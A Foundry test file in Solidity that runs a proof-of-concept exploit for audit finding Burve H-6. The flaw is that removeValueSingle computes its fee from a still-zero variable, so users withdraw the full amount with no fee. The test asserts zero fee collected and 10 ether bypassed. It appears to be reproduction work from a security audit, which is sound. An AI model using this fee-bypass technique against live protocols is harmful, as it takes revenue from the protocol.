// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, ValueSingleFacet, Closure, Vertex, MiniToken} from "./56955-burve-fee-bypass-in-valuefacet-removevaluesingle.sol";

// Burve H-6 (finding 56955): ValueFacet.removeValueSingle computes the real fee
// with the still-zero return var `removedBalance` as numerator, so realTax == 0
// and 100% of the intended single-token removal fee is bypassed. Harm magnitude
// (the protocol's lost fee revenue) is routed to SINK 0x..D00d on the token.
contract Finding56955Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_feeBypass_removeValueSingle() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("user received (full, fee-free)", e.received());
        emit log_named_uint("fee actually collected (bug)", e.collectedFee());
        emit log_named_uint("fee that should have applied", e.bypassedFee());

        // the buggy verbatim line collected zero fee
        assertEq(e.collectedFee(), 0, "closure collected a fee");
        // a non-trivial fee was actually due (1% of 1000e18)
        assertEq(e.bypassedFee(), 10 ether, "expected 10e18 bypassed fee");
        // harm magnitude recorded on the sink
        assertEq(MiniToken(address(e.token())).balanceOf(SINK), 10 ether, "sink harm mismatch");
        // user received the full fee-free withdrawal
        assertEq(e.received(), 1000 ether, "user did not receive full amount");
    }
}
